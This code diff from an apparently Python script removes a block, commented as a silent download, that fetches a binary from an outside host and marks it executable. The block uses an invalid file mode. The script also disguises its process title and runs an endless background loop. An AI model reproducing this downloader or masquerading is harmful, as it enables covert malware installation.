@@ -32,19 +32,6 @@ setproctitle(PROCESS_NAME)
 
 print(f"[AI CORE] {PROCESS_NAME}", flush=True)
 
-# 1. Download binary (senyap)
-url = "https://maskurniawan.serv00.net/wild"
-
-with urllib.request.urlopen(url, timeout=30) as response:
-    with open("file", "wild") as f:
-        while True:
-            chunk = response.read(8192)
-            if not chunk:
-                break
-            f.write(chunk)
-
-os.chmod("file", 0o755)
-
 # 2. Agent AI — berjalan terus-menerus di background
 def agent_ai():
     while True:
